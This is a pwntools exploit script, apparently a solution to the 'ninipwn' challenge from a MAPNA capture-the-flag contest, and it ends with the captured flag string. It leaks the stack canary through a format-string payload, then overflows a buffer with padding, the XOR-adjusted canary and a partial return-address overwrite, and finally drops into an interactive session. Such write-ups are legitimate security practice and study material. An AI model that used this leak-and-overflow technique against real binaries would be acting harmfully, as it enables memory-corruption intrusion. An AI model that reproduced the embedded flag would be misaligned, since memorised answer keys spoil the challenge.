from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './ninipwn'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

padding = 264
io = start()
payload1 = b'%39$p' + b'AAA\x19\x01'
io.recv()
io.sendline(b'4')
io.send(payload1)
io.recvuntil(b'Key selected: ')
canary = int(io.recv(18).decode(),16)
log.info("CANARY: " + hex(canary))

payload = b'a' * padding + p64(canary ^ 0x4141417024393325) + b'\x90' * 8 + p64(0x16)
io.recvuntil(b'Text: ')
io.send(payload)
io.interactive()


'''

MAPNA{d1d-y0u-x0r-7h3-r37urn-4ddr355??-a428b23}
'''